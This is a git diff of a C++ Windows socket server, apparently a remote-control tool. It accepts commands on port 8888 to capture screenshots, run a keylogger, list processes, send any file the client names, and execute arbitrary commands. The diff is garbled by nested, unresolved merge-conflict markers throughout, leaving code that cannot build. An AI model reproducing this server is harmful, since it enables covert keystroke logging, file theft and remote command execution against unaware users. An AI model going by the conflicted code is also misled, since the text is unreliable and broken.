@@ -1,4 +1,5 @@
 <<<<<<< Updated upstream
+<<<<<<< Updated upstream
 #include <iostream>
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -7,6 +8,9 @@
 
 using namespace std;
 =======
+=======
+
+>>>>>>> Stashed changes
 #include "../Application/lib.h"
 #include "../Application/executeCommand.h"
 #include <iostream>
@@ -43,6 +47,18 @@ bool send_all(SOCKET sock, const char *data, size_t size) {
   return true;
 }
 
+<<<<<<< Updated upstream
+=======
+// Helper function to extract file path from command
+std::string extract_file_path(const std::string &command) {
+  size_t pos = command.find(' ');
+  if (pos != std::string::npos && pos + 1 < command.length()) {
+    return trim(command.substr(pos + 1));
+  }
+  return "";
+}
+
+>>>>>>> Stashed changes
 // map command -> handler that fills outFile
 std::map<std::string, std::function<void(std::string &)>> commandHandlers = {
     {"get_screenshot",
@@ -58,7 +74,12 @@ std::map<std::string, std::function<void(std::string &)>> commandHandlers = {
     {"list_program",
      [](std::string &outFile) {
        outFile = saveDir + "programs.txt";
-       list_programs_to_file(outFile);
+       list_programs_to_file(outFile);  // đã đúng với listProgram.cpp
+     }},
+    {"list_process",
+     [](std::string &outFile) {
+       outFile = saveDir + "processes.txt";
+       list_processes_to_file(outFile);  // thêm mới, gọi đúng hàm
      }},
     {"keylogger", [](std::string &outFile) {
        outFile = saveDir + "keylog.txt";
@@ -86,6 +107,44 @@ void send_file_over_socket(SOCKET sock, const std::string &filename) {
                 sizeof(fileSize))) {
     std::cerr << "[Server] Failed to send file size\n";
     return;
+<<<<<<< Updated upstream
+  }
+
+  if (fileSize == 0) {
+    std::cout << "[Server] File is empty\n";
+    return;
+  }
+
+  // Send file content
+  char buffer[4096];
+  size_t sent = 0;
+
+  while (file && sent < fileSize) {
+    file.read(buffer, sizeof(buffer));
+    std::streamsize chunk = file.gcount();
+
+    if (chunk <= 0) break;
+
+    if (!send_all(sock, buffer, static_cast<size_t>(chunk))) {
+      std::cerr << "[Server] Failed to send file chunk at offset " << sent
+                << "\n";
+      return;
+    }
+
+    sent += chunk;
+    std::cout << "[Server] Progress: " << sent << "/" << fileSize << " bytes\n";
+  }
+
+  if (sent == fileSize) {
+    std::cout << "[Server] Successfully sent file " << filename << " (" << sent
+              << " bytes)\n";
+  } else {
+    std::cerr << "[Server] File transfer incomplete. Sent " << sent << "/"
+              << fileSize << " bytes\n";
+  }
+}
+>>>>>>> Stashed changes
+=======
   }
 
   if (fileSize == 0) {
@@ -127,6 +186,7 @@ int main() {
   WSADATA wsa;
   if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
 <<<<<<< Updated upstream
+<<<<<<< Updated upstream
     cerr << "[Server] WSAStartup error: " << WSAGetLastError() << endl;
     return 1;
   }
@@ -139,6 +199,8 @@ int main() {
   }
 
 =======
+=======
+>>>>>>> Stashed changes
     std::cerr << "[Server] WSAStartup failed: " << WSAGetLastError() << "\n";
     return 1;
   }
@@ -156,12 +218,16 @@ int main() {
   setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, (const char *)&opt,
              sizeof(opt));
 
+<<<<<<< Updated upstream
+>>>>>>> Stashed changes
+=======
 >>>>>>> Stashed changes
   sockaddr_in serverAddr{};
   serverAddr.sin_family = AF_INET;
   serverAddr.sin_port = htons(8888);
   serverAddr.sin_addr.s_addr = INADDR_ANY;
 
+<<<<<<< Updated upstream
 <<<<<<< Updated upstream
   if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) ==
       SOCKET_ERROR) {
@@ -170,6 +236,8 @@ int main() {
     WSACleanup();
     return 1;
 =======
+=======
+>>>>>>> Stashed changes
   if (bind(serverSocket, (sockaddr *)&serverAddr, sizeof(serverAddr)) ==
       SOCKET_ERROR) {
     std::cerr << "[Server] Bind failed: " << WSAGetLastError() << "\n";
@@ -218,16 +286,44 @@ int main() {
     std::cout << "[Server] Command from " << sender_email << ": " << command
               << "\n";
 
+<<<<<<< Updated upstream
     if (commandHandlers.count(command)) {
       std::string outFile;
       commandHandlers[command](outFile);
       send_file_over_socket(clientSocket, outFile);
     } else {
+=======
+    // Check if it's a send_file command
+    if (command.substr(0, 9) == "send_file") {
+      std::string filePath = extract_file_path(command);
+      if (filePath.empty()) {
+        std::cerr << "[Server] No file path provided for send_file command\n";
+        // Send empty file to indicate error
+        size_t errorSize = 0;
+        send_all(clientSocket, reinterpret_cast<const char *>(&errorSize),
+                 sizeof(errorSize));
+      } else {
+        std::cout << "[Server] Sending file: " << filePath << "\n";
+        send_file_over_socket(clientSocket, filePath);
+      }
+    }
+    // Check for predefined commands
+    else if (commandHandlers.count(command)) {
+      std::string outFile;
+      commandHandlers[command](outFile);
+      send_file_over_socket(clientSocket, outFile);
+    }
+    // Execute other commands
+    else {
+>>>>>>> Stashed changes
       execute_command_with_sender(sender_email, command);
     }
 
     closesocket(clientSocket);
     std::cout << "[Server] Connection closed.\n";
+<<<<<<< Updated upstream
+>>>>>>> Stashed changes
+=======
 >>>>>>> Stashed changes
   }
 
